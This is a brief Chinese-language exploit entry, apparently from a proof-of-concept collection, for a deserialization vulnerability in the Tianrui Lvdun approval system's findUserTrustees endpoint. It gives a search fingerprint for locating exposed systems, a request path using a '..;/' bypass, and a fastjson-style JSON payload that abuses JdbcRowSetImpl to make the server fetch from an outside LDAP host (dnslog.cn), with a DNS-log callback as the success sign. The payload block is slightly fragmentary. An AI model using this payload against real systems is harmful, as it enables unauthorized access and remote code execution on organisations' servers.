# 天锐绿盾审批系统findUserTrustees存在反序列化漏洞

天锐绿盾 ｜ 反序列化 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/..;/rest/ext/findUserTrustees  HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: application/json
"userId": "admin",
"userName": {
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "ldap://dnslog.cn",
"autoCommit": true
},
"Msgeffect": "true"
}
```
- **响应特征**：200 dnslog回显